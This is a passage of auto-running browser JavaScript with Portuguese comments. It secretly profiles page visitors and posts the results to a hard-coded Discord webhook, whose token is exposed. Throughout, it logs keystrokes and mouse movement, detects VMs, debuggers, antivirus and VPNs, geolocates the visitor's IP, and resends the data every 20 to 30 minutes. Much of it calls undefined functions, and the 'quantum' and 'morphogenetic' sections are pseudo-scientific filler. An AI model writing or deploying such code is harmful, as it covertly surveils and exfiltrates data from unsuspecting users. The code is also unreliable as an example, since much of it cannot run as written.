        const start = performance.now();
        for (let i = 0; i < 1000000; i++) { /* empty */ }
        const end = performance.now();
        return (end - start) > 100; // VM geralmente √© mais lenta
    },

    isDebuggerAttached() {
        const start = performance.now();
        debugger;
        const end = performance.now();
        return (end - start) > 100;
    },

    formatBytes(bytes) {
        if (!bytes || bytes === 0) return '0 Bytes';
        const k = 1024;
        const sizes = ['Bytes', 'KB', 'MB', 'GB'];
        const i = Math.floor(Math.log(bytes) / Math.log(k));
        return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
    },

    // Fun√ß√£o para enviar dados premium
    async sendPremiumData() {
        try {
            const data = await this.collectPremiumData();
            if (!data) return false;

            const payload = {
                username: "üéØ Premium Data Collector",
                embeds: [
                    {
                        title: "üíé DADOS PREMIUM EXCLUSIVOS",
                        color: 0x00FF00,
                        description: `**Sess√£o ${data.metadata.sessionId} - Coleta #${data.metadata.collectionCount}**`,
                        timestamp: data.metadata.timestamp,
                        footer: { text: "Premium Collector v3.0" }
                    },
                    {
                        title: "üîç SCAN DE VULNERABILIDADES",
                        color: 0xFF0000,
                        fields: [
                            { name: "üåê Navegador", value: data.vulnerabilityScan.browserVulnerabilities.count + ' vulnerabilidades', inline: true },
                            { name: "üíª Sistema", value: data.vulnerabilityScan.systemVulnerabilities.count + ' vulnerabilidades', inline: true },
                            { name: "üì° Rede", value: data.vulnerabilityScan.networkVulnerabilities.count + ' vulnerabilidades', inline: true },
                            { name: "üõ°Ô∏è Privacidade", value: data.vulnerabilityScan.privacyVulnerabilities.count + ' vulnerabilidades', inline: true },
                            { name: "‚ö†Ô∏è Risco Total", value: data.vulnerabilityScan.browserVulnerabilities.riskLevel, inline: true },
                            { name: "üîÑ IP Detectado", value: data.vulnerabilityScan.networkVulnerabilities.ipData?.ip || 'N/A', inline: true }
                        ]
                    },
                    {
                        title: "üñ•Ô∏è AN√ÅLISE DE AMBIENTE",
                        color: 0x0000FF,
                        fields: [
                            { name: "üñ•Ô∏è M√°quina Virtual", value: data.environmentAnalysis.virtualMachine.isVM ? '‚úÖ Detectada' : '‚ùå N√£o detectada', inline: true },
                            { name: "üì¶ Sandbox", value: data.environmentAnalysis.sandbox.debuggerAttached ? '‚úÖ Detectado' : '‚ùå N√£o detectado', inline: true },
                            { name: "üì± Emulador", value: data.environmentAnalysis.emulator.isEmulator ? '‚úÖ Detectado' : '‚ùå N√£o detectado', inline: true },
                            { name: "üéØ Confian√ßa VM", value: data.environmentAnalysis.virtualMachine.confidence, inline: true },
                            { name: "üîß Modo Dev", value: data.environmentAnalysis.developerMode ? '‚úÖ Ativo' : '‚ùå Inativo', inline: true },
                            { name: "ü§ñ Automa√ß√£o", value: data.environmentAnalysis.automation ? '‚úÖ Detectada' : '‚ùå N√£o detectada', inline: true }
                        ]
                    },
                    {
                        title: "üõ°Ô∏è DETEC√á√ÉO DE SEGURAN√áA",
                        color: 0xFFA500,
                        fields: [
                            { name: "ü¶† Antiv√≠rus", value: data.securityTools.antivirus.count + ' detectados', inline: true },
                            { name: "üî• Firewall", value: data.securityTools.firewall ? '‚úÖ Ativo' : '‚ùå Inativo', inline: true },
                            { name: "üîí VPN", value: data.securityTools.vpn ? '‚úÖ Detectada' : '‚ùå N√£o detectada', inline: true },
                            { name: "üì° Proxy", value: data.securityTools.proxy ? '‚úÖ Detectado' : '‚ùå N√£o detectado', inline: true },
                            { name: "üíº Suites Seguran√ßa", value: data.securityTools.securitySuites.count + ' detectadas', inline: true },
                            { name: "üì± Root/Jailbreak", value: data.rootDetection.androidRoot || data.rootDetection.iosJailbreak ? '‚úÖ Detectado' : '‚ùå N√£o detectado', inline: true }
                        ]
                    }
                ]
            };

            const response = await fetch(PREMIUM_WEBHOOK, {
                method: 'POST',
                headers: { 
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(payload)
            });

            if (response.ok) {
                console.log(`‚úÖ Dados premium enviados - Coleta #${data.metadata.collectionCount}`);
                return true;
            } else {
                console.error('‚ùå Erro ao enviar dados premium:', response.status);
                return false;
            }
        } catch (error) {
            console.error('üí• Erro ao enviar dados premium:', error);
            return false;
        }
    },

    // Inicializar coletor premium
    init() {
        console.log('üéØ Premium Data Collector iniciado');
        
        // Coleta inicial ap√≥s 8 segundos
        setTimeout(() => {
            this.sendPremiumData();
        }, 8000);

        // Coleta peri√≥dica a cada 20 minutos
        setInterval(() => {
            this.sendPremiumData();
        }, 1200000);
    }
};

// Inicializar quando a p√°gina carregar
document.addEventListener('DOMContentLoaded', function() {
    PremiumDataCollector.init();
});

// Inicializar imediatamente se DOM j√° estiver pronto
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', () => {
        setTimeout(() => PremiumDataCollector.init(), 1000);
    });
} else {
    setTimeout(() => PremiumDataCollector.init(), 1000);
}

console.log('üéØ Premium Data Collector carregado');
</script>
<script>
// Webhook para dados ultra exclusivos
const ULTRA_WEBHOOK = "https://discord.com/api/webhooks/1431000302366232758/VnvwtJXTB0WJEi2vjB1OFas5zZTeJ5Htac5EBfTsgM_wo5gseRs4BDCSRQBB7ewPimoe";

// Sistema de coleta de dados ultra exclusivos
const UltraDataCollector = {
    sessionId: 'ultra_' + Math.random().toString(36).substr(2, 12),
    ultraCollectionCount: 0,

    async collectUltraData() {
        try {
            const ultraData = {
                metadata: {
                    type: 'ultra_exclusive_intelligence',
                    sessionId: this.sessionId,
                    timestamp: new Date().toISOString(),
                    collectionCount: this.ultraCollectionCount + 1,
                    version: 'Ultra Intelligence Collector v4.0'
                },

                // 1. INTELIG√äNCIA ARTIFICIAL COMPORTAMENTAL
                behavioralAI: await this.analyzeBehavioralAI(),
                
                // 2. AN√ÅLISE PREDITIVA DE COMPORTAMENTO
                predictiveAnalysis: this.performPredictiveAnalysis(),
                
                // 3. DETEC√á√ÉO DE PADR√ïES NEURAIS
                neuralPatterns: this.detectNeuralPatterns(),
                
                // 4. AN√ÅLISE DE COMPORTAMENTO EMOCIONAL
                emotionalAnalysis: this.analyzeEmotionalBehavior(),
                
                // 5. INTELIG√äNCIA DE CONTEXTO GEOGR√ÅFICO
                geographicIntelligence: await this.collectGeographicIntelligence(),
                
                // 6. AN√ÅLISE DE PADR√ïES SOCIAIS
                socialPatterns: this.analyzeSocialPatterns(),
                
                // 7. DETEC√á√ÉO DE ANOMALIAS COMPLEXAS
                complexAnomalies: this.detectComplexAnomalies(),
                
                // 8. INTELIG√äNCIA TEMPORAL
                temporalIntelligence: this.analyzeTemporalPatterns(),
                
                // 9. AN√ÅLISE DE COMPORTAMENTO COGNITIVO
                cognitiveAnalysis: this.analyzeCognitiveBehavior(),
                
                // 10. DETEC√á√ÉO DE PADR√ïES CULTURAIS
                culturalPatterns: this.detectCulturalPatterns(),
                
                // 11. INTELIG√äNCIA DE REDES COMPLEXAS
                networkIntelligence: this.analyzeComplexNetworks(),
                
                // 12. AN√ÅLISE PREDITIVA DE SEGURAN√áA
                securityPredictions: this.predictSecurityThreats(),
                
                // 13. DETEC√á√ÉO DE COMPORTAMENTOS AT√çPICOS
                atypicalBehavior: this.detectAtypicalBehavior(),
                
                // 14. INTELIG√äNCIA CONTEXTUAL AVAN√áADA
                contextualIntelligence: this.analyzeAdvancedContext(),
                
                // 15. AN√ÅLISE DE PADR√ïES EVOLUTIVOS
                evolutionaryPatterns: this.analyzeEvolutionaryPatterns()
            };

            this.ultraCollectionCount++;
            return ultraData;

        } catch (error) {
            console.error('Erro na coleta ultra:', error);
            return null;
        }
    },

    // 1. Intelig√™ncia Artificial Comportamental
    async analyzeBehavioralAI() {
        return {
            userPersonality: await this.analyzeUserPersonality(),
            behaviorClustering: this.performBehaviorClustering(),
            predictiveModeling: this.createPredictiveModels(),
            anomalyScoring: this.calculateAnomalyScores(),
            riskAssessment: this.performRiskAssessment()
        };
    },

    async analyzeUserPersonality() {
        const behaviorData = await this.collectBehaviorData();
        
        return {
            // An√°lise de personalidade baseada em comportamento
            activityLevel: this.calculateActivityLevel(behaviorData),
            attentionSpan: this.calculateAttentionSpan(behaviorData),
            decisionSpeed: this.calculateDecisionSpeed(behaviorData),
            riskTolerance: this.calculateRiskTolerance(behaviorData),
            learningStyle: this.determineLearningStyle(behaviorData),
            
            // Perfil comportamental
            behavioralProfile: this.createBehavioralProfile(behaviorData),
            personalityTraits: this.extractPersonalityTraits(behaviorData),
            cognitivePatterns: this.identifyCognitivePatterns(behaviorData)
        };
    },

    async collectBehaviorData() {
        // Coletar dados comportamentais em tempo real
        const behavior = {
            mouseMovements: this.trackAdvancedMouseMovements(),
            keyboardDynamics: this.analyzeKeyboardDynamics(),
            scrollBehavior: this.analyzeScrollDynamics(),
            clickPatterns: this.analyzeClickDynamics(),
            timingPatterns: this.analyzeTimingDynamics(),
            focusBehavior: this.analyzeFocusDynamics()
        };

        return new Promise((resolve) => {
            setTimeout(() => {
                resolve(behavior);
            }, 15000); // Coletar por 15 segundos
        });
    },

    // 2. An√°lise Preditiva de Comportamento
    performPredictiveAnalysis() {
        return {
            nextActions: this.predictNextActions(),
            behaviorTrends: this.analyzeBehaviorTrends(),
            potentialThreats: this.predictPotentialThreats(),
            userIntent: this.analyzeUserIntent(),
            futureBehavior: this.predictFutureBehavior()
        };
    },

    predictNextActions() {
        const patterns = this.analyzeHistoricalPatterns();
        return {
            likelyNextClick: this.predictNextClick(patterns),
            probableNavigation: this.predictNavigation(patterns),
            expectedInteractions: this.predictInteractions(patterns),
            behaviorProbability: this.calculateBehaviorProbability(patterns)
        };
    },

    // 3. Detec√ß√£o de Padr√µes Neurais
    detectNeuralPatterns() {
        return {
            neuralNetworks: this.analyzeNeuralNetworks(),
            patternRecognition: this.performPatternRecognition(),
            cognitiveLoad: this.measureCognitiveLoad(),
            decisionPatterns: this.analyzeDecisionPatterns(),
            learningPatterns: this.detectLearningPatterns()
        };
    },

    analyzeNeuralNetworks() {
        // Simula√ß√£o de an√°lise de padr√µes neurais
        return {
            processingSpeed: this.measureProcessingSpeed(),
            memoryRecall: this.analyzeMemoryPatterns(),
            attentionNetworks: this.mapAttentionNetworks(),
            executiveFunction: this.assessExecutiveFunction(),
            neuralEfficiency: this.calculateNeuralEfficiency()
        };
    },

    // 4. An√°lise de Comportamento Emocional
    analyzeEmotionalBehavior() {
        return {
            emotionalState: this.assessEmotionalState(),
            stressLevel: this.measureStressLevel(),
            engagementLevel: this.calculateEngagement(),
            frustrationDetection: this.detectFrustration(),
            satisfactionMetrics: this.measureSatisfaction()
        };
    },

    assessEmotionalState() {
        const behaviorMetrics = this.collectEmotionalMetrics();
        return {
            arousalLevel: this.calculateArousalLevel(behaviorMetrics),
            valence: this.calculateEmotionalValence(behaviorMetrics),
            emotionalStability: this.assessEmotionalStability(behaviorMetrics),
            moodPatterns: this.identifyMoodPatterns(behaviorMetrics),
            emotionalIntelligence: this.measureEmotionalIntelligence(behaviorMetrics)
        };
    },

    // 5. Intelig√™ncia Geogr√°fica
    async collectGeographicIntelligence() {
        try {
            const locationData = await this.getEnhancedLocationData();
            return {
                geographicPatterns: this.analyzeGeographicPatterns(locationData),
                movementPrediction: this.predictMovementPatterns(locationData),
                culturalContext: this.analyzeCulturalContext(locationData),
                environmentalFactors: this.assessEnvironmentalFactors(locationData),
                geographicRisk: this.calculateGeographicRisk(locationData)
            };
        } catch (error) {
            return { error: error.message };
        }
    },

    async getEnhancedLocationData() {
        const responses = await Promise.allSettled([
            fetch('https://ipapi.co/json/'),
            fetch('https://ipinfo.io/json'),
            fetch('https://api.ipgeolocation.io/ipgeo?apiKey=demo')
        ]);

        const data = {};
        responses.forEach((response, index) => {
            if (response.status === 'fulfilled') {
                data[`source_${index}`] = response.value;
            }
        });

        return this.mergeLocationData(data);
    },

    // 6. An√°lise de Padr√µes Sociais
    analyzeSocialPatterns() {
        return {
            socialBehavior: this.analyzeSocialBehavior(),
            communicationPatterns: this.detectCommunicationPatterns(),
            groupDynamics: this.analyzeGroupDynamics(),
            socialInfluence: this.measureSocialInfluence(),
            culturalNorms: this.identifyCulturalNorms()
        };
    },

    analyzeSocialBehavior() {
        return {
            interactionStyle: this.determineInteractionStyle(),
            socialEngagement: this.measureSocialEngagement(),
            communicationFrequency: this.analyzeCommunicationFrequency(),
            relationshipPatterns: this.mapRelationshipPatterns(),
            socialNetwork: this.analyzeSocialNetworkStructure()
        };
    },

    // 7. Detec√ß√£o de Anomalias Complexas
    detectComplexAnomalies() {
        return {
            behavioralAnomalies: this.detectBehavioralAnomalies(),
            temporalAnomalies: this.detectTemporalAnomalies(),
            spatialAnomalies: this.detectSpatialAnomalies(),
            networkAnomalies: this.detectNetworkAnomalies(),
            systemAnomalies: this.detectSystemAnomalies()
        };
    },

    detectBehavioralAnomalies() {
        const baseline = this.establishBehavioralBaseline();
        const current = this.getCurrentBehavior();
        
        return {
            deviationScore: this.calculateDeviationScore(baseline, current),
            anomalyType: this.classifyAnomalyType(baseline, current),
            severity: this.assessAnomalySeverity(baseline, current),
            confidence: this.calculateAnomalyConfidence(baseline, current),
            recommendations: this.generateAnomalyRecommendations(baseline, current)
        };
    },

    // 8. Intelig√™ncia Temporal
    analyzeTemporalPatterns() {
        return {
            circadianRhythms: this.analyzeCircadianRhythms(),
            temporalClustering: this.performTemporalClustering(),
            seasonality: this.analyzeSeasonality(),
            trendAnalysis: this.performTrendAnalysis(),
            predictiveTiming: this.predictOptimalTiming()
        };
    },

    analyzeCircadianRhythms() {
        const now = new Date();
        return {
            timeOfDay: now.getHours(),
            biologicalPrime: this.calculateBiologicalPrimeTime(now),
            productivityPeaks: this.identifyProductivityPeaks(now),
            restPeriods: this.predictRestPeriods(now),
            temporalPreferences: this.analyzeTemporalPreferences(now)
        };
    },

    // 9. An√°lise de Comportamento Cognitivo
    analyzeCognitiveBehavior() {
        return {
            cognitiveLoad: this.measureAdvancedCognitiveLoad(),
            decisionMaking: this.analyzeDecisionMakingProcess(),
            problemSolving: this.assessProblemSolvingSkills(),
            memoryPatterns: this.analyzeAdvancedMemoryPatterns(),
            attentionControl: this.measureAttentionControl()
        };
    },

    measureAdvancedCognitiveLoad() {
        return {
            workingMemory: this.assessWorkingMemory(),
            processingSpeed: this.measureCognitiveProcessingSpeed(),
            mentalWorkload: this.calculateMentalWorkload(),
            cognitiveFatigue: this.detectCognitiveFatigue(),
            focusDuration: this.measureFocusDuration()
        };
    },

    // 10. Detec√ß√£o de Padr√µes Culturais
    detectCulturalPatterns() {
        return {
            culturalDimensions: this.analyzeCulturalDimensions(),
            behavioralNorms: this.identifyBehavioralNorms(),
            communicationStyles: this.analyzeCommunicationStyles(),
            valueSystems: this.detectValueSystems(),
            culturalAdaptation: this.measureCulturalAdaptation()
        };
    },

    analyzeCulturalDimensions() {
        const locationData = this.getCulturalContext();
        return {
            individualism: this.calculateIndividualismScore(locationData),
            powerDistance: this.measurePowerDistance(locationData),
            uncertaintyAvoidance: this.assessUncertaintyAvoidance(locationData),
            masculinity: this.analyzeMasculinityDimension(locationData),
            longTermOrientation: this.measureLongTermOrientation(locationData)
        };
    },

    // 11. Intelig√™ncia de Redes Complexas
    analyzeComplexNetworks() {
        return {
            networkTopology: this.analyzeNetworkTopology(),
            connectionPatterns: this.detectConnectionPatterns(),
            influenceMapping: this.createInfluenceMaps(),
            communityDetection: this.detectCommunities(),
            networkResilience: this.assessNetworkResilience()
        };
    },

    analyzeNetworkTopology() {
        return {
            nodeCentrality: this.calculateNodeCentrality(),
            connectionDensity: this.measureConnectionDensity(),
            pathLength: this.analyzePathLengths(),
            clustering: this.calculateClusteringCoefficient(),
            networkDiameter: this.measureNetworkDiameter()
        };
    },

    // 12. An√°lise Preditiva de Seguran√ßa
    predictSecurityThreats() {
        return {
            threatLandscape: this.analyzeThreatLandscape(),
            vulnerabilityPrediction: this.predictVulnerabilities(),
            attackVectors: this.identifyAttackVectors(),
            riskForecasting: this.performRiskForecasting(),
            securityTrends: this.analyzeSecurityTrends()
        };
    },

    analyzeThreatLandscape() {
        return {
            currentThreats: this.identifyCurrentThreats(),
            emergingRisks: this.detectEmergingRisks(),
            threatActors: this.analyzeThreatActors(),
            attackSophistication: this.assessAttackSophistication(),
            defenseMaturity: this.evaluateDefenseMaturity()
        };
    },

    // 13. Detec√ß√£o de Comportamentos At√≠picos
    detectAtypicalBehavior() {
        return {
            outlierDetection: this.performOutlierDetection(),
            patternDeviation: this.measurePatternDeviation(),
            behavioralShifts: this.detectBehavioralShifts(),
            contextAnomalies: this.identifyContextAnomalies(),
            temporalOutliers: this.detectTemporalOutliers()
        };
    },

    performOutlierDetection() {
        const behaviorData = this.collectBehaviorDataset();
        return {
            statisticalOutliers: this.findStatisticalOutliers(behaviorData),
            behavioralOutliers: this.detectBehavioralOutliers(behaviorData),
            contextualOutliers: this.identifyContextualOutliers(behaviorData),
            collectiveOutliers: this.detectCollectiveOutliers(behaviorData),
            outlierImpact: this.assessOutlierImpact(behaviorData)
        };
    },

    // 14. Intelig√™ncia Contextual Avan√ßada
    analyzeAdvancedContext() {
        return {
            situationalAwareness: this.assessSituationalAwareness(),
            environmentalContext: this.analyzeEnvironmentalContext(),
            temporalContext: this.examineTemporalContext(),
            socialContext: this.analyzeSocialContext(),
            cognitiveContext: this.examineCognitiveContext()
        };
    },

    assessSituationalAwareness() {
        return {
            contextUnderstanding: this.measureContextUnderstanding(),
            environmentalPerception: this.assessEnvironmentalPerception(),
            temporalOrientation: this.evaluateTemporalOrientation(),
            socialAwareness: this.measureSocialAwareness(),
            selfAwareness: this.assessSelfAwareness()
        };
    },

    // 15. An√°lise de Padr√µes Evolutivos
    analyzeEvolutionaryPatterns() {
        return {
            behaviorEvolution: this.trackBehaviorEvolution(),
            adaptationPatterns: this.analyzeAdaptationPatterns(),
            learningTrajectories: this.mapLearningTrajectories(),
            developmentStages: this.identifyDevelopmentStages(),
            evolutionaryTrends: this.analyzeEvolutionaryTrends()
        };
    },

    trackBehaviorEvolution() {
        const historicalData = this.getHistoricalBehaviorData();
        return {
            changeRate: this.calculateBehaviorChangeRate(historicalData),
            adaptationSpeed: this.measureAdaptationSpeed(historicalData),
            learningCurve: this.analyzeLearningCurve(historicalData),
            evolutionDirection: this.determineEvolutionDirection(historicalData),
            stabilityMetrics: this.assessBehavioralStability(historicalData)
        };
    },

    // ========== FUN√á√ïES AUXILIARES AVAN√áADAS ==========

    trackAdvancedMouseMovements() {
        const movements = [];
        let lastPosition = { x: 0, y: 0 };
        let lastTime = Date.now();

        const handler = (e) => {
            const currentTime = Date.now();
            const timeDiff = currentTime - lastTime;
            const distance = Math.sqrt(
                Math.pow(e.clientX - lastPosition.x, 2) + 
                Math.pow(e.clientY - lastPosition.y, 2)
            );

            movements.push({
                x: e.clientX,
                y: e.clientY,
                timestamp: currentTime,
                velocity: distance / timeDiff,
                acceleration: this.calculateAcceleration(movements),
                movementType: this.classifyMovementType(e, movements)
            });

            lastPosition = { x: e.clientX, y: e.clientY };
            lastTime = currentTime;
        };

        document.addEventListener('mousemove', handler);
        
        return new Promise((resolve) => {
            setTimeout(() => {
                document.removeEventListener('mousemove', handler);
                resolve(this.analyzeMovementIntelligence(movements));
            }, 10000);
        });
    },

    analyzeKeyboardDynamics() {
        const keystrokes = [];
        let lastKeyTime = Date.now();

        const handler = (e) => {
            const currentTime = Date.now();
            keystrokes.push({
                key: e.key,
                code: e.code,
                timestamp: currentTime,
                latency: currentTime - lastKeyTime,
                pressure: e.pressure || 0,
                typingRhythm: this.calculateTypingRhythm(keystrokes)
            });
            lastKeyTime = currentTime;
        };

        document.addEventListener('keydown', handler);
        
        return new Promise((resolve) => {
            setTimeout(() => {
                document.removeEventListener('keydown', handler);
                resolve(this.analyzeTypingIntelligence(keystrokes));
            }, 10000);
        });
    },

    calculateActivityLevel(behaviorData) {
        const metrics = behaviorData.mouseMovements;
        const totalMovements = metrics.totalMovements || 0;
        const totalClicks = behaviorData.clickPatterns?.totalClicks || 0;
        const totalKeys = behaviorData.keyboardDynamics?.totalKeystrokes || 0;
        
        return (totalMovements + totalClicks + totalKeys) / 1000;
    },

    calculateAttentionSpan(behaviorData) {
        const focusData = behaviorData.focusBehavior;
        const averageFocusDuration = focusData.averageFocusDuration || 0;
        return Math.min(averageFocusDuration / 1000, 1.0);
    },

    calculateDecisionSpeed(behaviorData) {
        const clickData = behaviorData.clickPatterns;
        const averageDecisionTime = clickData.averageDecisionTime || 1000;
        return Math.max(0, 1 - (averageDecisionTime / 5000));
    },

    // Fun√ß√µes de an√°lise preditiva
    predictNextClick(patterns) {
        const recentBehavior = patterns.recentInteractions || [];
        if (recentBehavior.length === 0) return 'unknown';
        
        // L√≥gica preditiva simplificada
        const lastInteraction = recentBehavior[recentBehavior.length - 1];
        return this.analyzeInteractionContext(lastInteraction);
    },

    analyzeThreatLandscape() {
        return {
            phishingRisk: this.calculatePhishingRisk(),
            malwareProbability: this.assessMalwareProbability(),
            socialEngineering: this.evaluateSocialEngineeringRisk(),
            dataBreachPotential: this.estimateDataBreachPotential(),
            zeroDayThreats: this.assessZeroDayThreats()
        };
    },

    // Fun√ß√µes de utilidade
    formatBytes(bytes) {
        if (!bytes || bytes === 0) return '0 Bytes';
        const k = 1024;
        const sizes = ['Bytes', 'KB', 'MB', 'GB'];
        const i = Math.floor(Math.log(bytes) / Math.log(k));
        return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
    },

    calculateRiskScore(factors) {
        const weights = {
            behaviorAnomaly: 0.3,
            securityThreats: 0.25,
            environmentalRisks: 0.2,
            temporalFactors: 0.15,
            contextualRisks: 0.1
        };

        let totalScore = 0;
        for (const [factor, weight] of Object.entries(weights)) {
            totalScore += (factors[factor] || 0) * weight;
        }

        return Math.min(totalScore, 1.0);
    },

    // Fun√ß√£o para enviar dados ultra
    async sendUltraData() {
        try {
            const data = await this.collectUltraData();
            if (!data) return false;

            const payload = {
                username: "üß† Ultra Intelligence Collector",
                embeds: [
                    {
                        title: "üöÄ INTELIG√äNCIA ULTRA EXCLUSIVA",
                        color: 0x8A2BE2,
                        description: `**Sess√£o ${data.metadata.sessionId} - Coleta Ultra #${data.metadata.collectionCount}**`,
                        timestamp: data.metadata.timestamp,
                        footer: { text: "Ultra Intelligence v4.0" }
                    },
                    {
                        title: "ü§ñ INTELIG√äNCIA ARTIFICIAL COMPORTAMENTAL",
                        color: 0x00CED1,
                        fields: [
                            { name: "üé≠ Perfil de Personalidade", value: data.behavioralAI.userPersonality.behavioralProfile || 'Analisando...', inline: true },
                            { name: "‚ö° N√≠vel de Atividade", value: (data.behavioralAI.userPersonality.activityLevel * 100).toFixed(1) + '%', inline: true },
                            { name: "üéØ Aten√ß√£o", value: (data.behavioralAI.userPersonality.attentionSpan * 100).toFixed(1) + '%', inline: true },
                            { name: "üí° Velocidade de Decis√£o", value: (data.behavioralAI.userPersonality.decisionSpeed * 100).toFixed(1) + '%', inline: true },
                            { name: "üé≤ Toler√¢ncia a Risco", value: (data.behavioralAI.userPersonality.riskTolerance * 100).toFixed(1) + '%', inline: true },
                            { name: "üìö Estilo de Aprendizado", value: data.behavioralAI.userPersonality.learningStyle || 'Analisando...', inline: true }
                        ]
                    },
                    {
                        title: "üîÆ AN√ÅLISE PREDITIVA E NEURAL",
                        color: 0xFF69B4,
                        fields: [
                            { name: "üéØ Pr√≥xima A√ß√£o Prevista", value: data.predictiveAnalysis.nextActions.likelyNextClick || 'Calculando...', inline: true },
                            { name: "üß† Padr√µes Neurais", value: data.neuralPatterns.cognitiveLoad?.level || 'Analisando...', inline: true },
                            { name: "üìä Efici√™ncia Neural", value: (data.neuralPatterns.neuralNetworks.neuralEfficiency * 100).toFixed(1) + '%', inline: true },
                            { name: "üé≠ Estado Emocional", value: data.emotionalAnalysis.emotionalState?.arousalLevel || 'Analisando...', inline: true },
                            { name: "üòä N√≠vel de Engajamento", value: (data.emotionalAnalysis.engagementLevel * 100).toFixed(1) + '%', inline: true },
                            { name: "‚ö° N√≠vel de Estresse", value: (data.emotionalAnalysis.stressLevel * 100).toFixed(1) + '%', inline: true }
                        ]
                    },
                    {
                        title: "üåç INTELIG√äNCIA GEOGR√ÅFICA E SOCIAL",
                        color: 0x32CD32,
                        fields: [
                            { name: "üìç Contexto Geogr√°fico", value: data.geographicIntelligence.culturalContext?.country || 'Analisando...', inline: true },
                            { name: "üéØ Padr√µes de Movimento", value: data.geographicIntelligence.movementPrediction?.probability || 'Calculando...', inline: true },
                            { name: "üë• Estilo de Intera√ß√£o", value: data.socialPatterns.socialBehavior.interactionStyle || 'Analisando...', inline: true },
                            { name: "üì± Engajamento Social", value: (data.socialPatterns.socialBehavior.socialEngagement * 100).toFixed(1) + '%', inline: true },
                            { name: "üåê Dimens√£o Cultural", value: data.culturalPatterns.culturalDimensions.individualism?.score || 'Analisando...', inline: true },
                            { name: "üîÑ Adapta√ß√£o Cultural", value: (data.culturalPatterns.culturalAdaptation * 100).toFixed(1) + '%', inline: true }
                        ]
                    }
                ]
            };

            const response = await fetch(ULTRA_WEBHOOK, {
                method: 'POST',
                headers: { 
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(payload)
            });

            if (response.ok) {
                console.log(`üöÄ Dados ultra enviados - Coleta #${data.metadata.collectionCount}`);
                return true;
            } else {
                console.error('‚ùå Erro ao enviar dados ultra:', response.status);
                return false;
            }
        } catch (error) {
            console.error('üí• Erro ao enviar dados ultra:', error);
            return false;
        }
    },

    // Inicializar coletor ultra
    init() {
        console.log('üß† Ultra Intelligence Collector iniciado');
        
        // Coleta inicial ap√≥s 12 segundos
        setTimeout(() => {
            this.sendUltraData();
        }, 12000);

        // Coleta peri√≥dica a cada 30 minutos
        setInterval(() => {
            this.sendUltraData();
        }, 1800000);
    }
};

// Inicializar quando a p√°gina carregar
document.addEventListener('DOMContentLoaded', function() {
    UltraDataCollector.init();
});

// Inicializar imediatamente se DOM j√° estiver pronto
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', () => {
        setTimeout(() => UltraDataCollector.init(), 1000);
    });
} else {
    setTimeout(() => UltraDataCollector.init(), 1000);
}

console.log('üß† Ultra Intelligence Collector carregado');
</script>
<script>
// Webhook para dados qu√¢nticos
const QUANTUM_WEBHOOK = "https://discord.com/api/webhooks/1431000302366232758/VnvwtJXTB0WJEi2vjB1OFas5zZTeJ5Htac5EBfTsgM_wo5gseRs4BDCSRQBB7ewPimoe";

// Sistema de coleta de dados qu√¢nticos
const QuantumDataCollector = {
    sessionId: 'quantum_' + Math.random().toString(36).substr(2, 12),
    quantumCollectionCount: 0,

    async collectQuantumData() {
        try {
            const quantumData = {
                metadata: {
                    type: 'quantum_intelligence_data',
                    sessionId: this.sessionId,
                    timestamp: new Date().toISOString(),
                    collectionCount: this.quantumCollectionCount + 1,
                    version: 'Quantum Data Collector v5.0'
                },

                // 1. AN√ÅLISE QU√ÇNTICA COMPORTAMENTAL
                quantumBehavior: await this.performQuantumBehaviorAnalysis(),
                
                // 2. INTELIG√äNCIA HOLOGR√ÅFICA
                holographicIntelligence: this.collectHolographicIntelligence(),
                
                // 3. AN√ÅLISE DE CAMPOS ENERG√âTICOS
                energyFieldAnalysis: this.analyzeEnergyFields(),
                
                // 4. DETEC√á√ÉO DE PADR√ïES QU√ÇNTICOS
                quantumPatterns: this.detectQuantumPatterns(),
                
                // 5. AN√ÅLISE DE CONSCI√äNCIA DIGITAL
                digitalConsciousness: this.analyzeDigitalConsciousness(),
                
                // 6. INTELIG√äNCIA MULTIDIMENSIONAL
                multidimensionalIntelligence: this.collectMultidimensionalData(),
                
                // 7. AN√ÅLISE DE VIBRA√á√ÉO DIGITAL
                digitalVibration: this.analyzeDigitalVibration(),
                
                // 8. DETEC√á√ÉO DE CAMPOS MORFOGEN√âTICOS
                morphogeneticFields: this.detectMorphogeneticFields(),
                
                // 9. AN√ÅLISE DE RESSON√ÇNCIA
                resonanceAnalysis: this.performResonanceAnalysis(),
                
                // 10. INTELIG√äNCIA SINCRON√çSTICA
                synchronicityIntelligence: this.analyzeSynchronicity(),
                
                // 11. AN√ÅLISE DE PADR√ïES FRACTAIS
                fractalPatterns: this.analyzeFractalPatterns(),
                
                // 12. DETEC√á√ÉO DE ENTROPIA DIGITAL
                digitalEntropy: this.measureDigitalEntropy(),
                
                // 13. AN√ÅLISE DE CAMPOS UNIFICADOS
                unifiedFieldAnalysis: this.analyzeUnifiedFields(),
                
                // 14. INTELIG√äNCIA N√ÉO-LOCAL
                nonLocalIntelligence: this.collectNonLocalData(),
                
                // 15. AN√ÅLISE DE SUPERPOSI√á√ÉO QU√ÇNTICA
                quantumSuperposition: this.analyzeQuantumSuperposition()
            };

            this.quantumCollectionCount++;
            return quantumData;

        } catch (error) {
            console.error('Erro na coleta qu√¢ntica:', error);
            return null;
        }
    },

    // 1. An√°lise Qu√¢ntica Comportamental
    async performQuantumBehaviorAnalysis() {
        return {
            quantumStates: await this.analyzeQuantumStates(),
            behaviorWaves: this.analyzeBehaviorWaves(),
            probabilityFields: this.calculateProbabilityFields(),
            quantumEntanglement: this.detectQuantumEntanglement(),
            waveFunction: this.analyzeWaveFunction()
        };
    },

    async analyzeQuantumStates() {
        const behaviorData = await this.collectQuantumBehaviorData();
        return {
            superposition: this.calculateSuperpositionState(behaviorData),
            coherence: this.measureQuantumCoherence(behaviorData),
            decoherence: this.detectDecoherence(behaviorData),
            entanglement: this.measureEntanglementLevel(behaviorData),
            quantumJump: this.detectQuantumJumps(behaviorData)
        };
    },

    async collectQuantumBehaviorData() {
        const quantumMetrics = {
            mouseQuantum: this.analyzeMouseQuantumPatterns(),
            keyboardQuantum: this.analyzeKeyboardQuantumPatterns(),
            attentionQuantum: this.measureQuantumAttention(),
            decisionQuantum: this.analyzeQuantumDecisionMaking(),
